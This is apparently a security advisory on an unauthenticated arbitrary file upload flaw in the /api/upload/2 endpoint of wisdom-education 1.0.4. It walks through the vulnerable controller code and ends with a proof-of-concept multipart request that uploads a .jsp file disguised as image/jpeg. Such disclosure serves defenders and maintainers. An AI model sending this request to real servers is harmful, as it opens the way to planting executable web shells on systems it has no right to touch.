# Vulnerability Introduction

The /api/upload/2 interface in version 1.0.4 of wisdom-education allows for arbitrary file uploads on the front end. An attacker can construct an upload interface to upload any malicious file to the target server.

# Vulnerability analysis

Vulnerable class fileï¼šsrc/main/java/com/education/core/controller/UploadController.java

![image-20250928013503356](https://github.com/xkalami-Tta0/picx-images-hosting/raw/master/wisdom-education/image-20250928013503356.8z6wat5261.webp)

The `getOriginalFilename` method retrieves the original file name of the uploaded file, while `FilenameUtils.getExtension` extracts the file extension. The `fileUpload.putObject` method is invoked to handle the file upload process. The `FileUtil.writeFromStream` method is used to write the content to a file in the specified path. No filtering is applied, which could lead to arbitrary file upload.

![image-20250928013713641](https://github.com/xkalami-Tta0/picx-images-hosting/raw/master/wisdom-education/image-20250928013713641.6bhg0ge21g.webp)

uploadFileType Obtain the corresponding file type enumeration object by calling the FileTypeEnum.getFileTypeEnumByCode() method

![image-20250928013830046](https://github.com/xkalami-Tta0/picx-images-hosting/raw/master/wisdom-education/image-20250928013830046.3nrzq3ldmi.webp)

And the /api/upload interface is a whitelist interface in AdminAuthInterceptor.java, which can be directly constructed and triggered by the front end.

![image-20250928013901991](https://github.com/xkalami-Tta0/picx-images-hosting/raw/master/wisdom-education/image-20250928013901991.3k8dsdslac.webp)

# Vulnerability reproduction

poc

```
POST /api/upload/2 HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKfAHSQTSwCjo25Kz
Content-Length: 2890

------WebKitFormBoundaryKfAHSQTSwCjo25Kz
Content-Disposition: form-data; name="file"; filename="test.jsp"
Content-Type: image/jpeg

123123
------WebKitFormBoundaryKfAHSQTSwCjo25Kz--
```

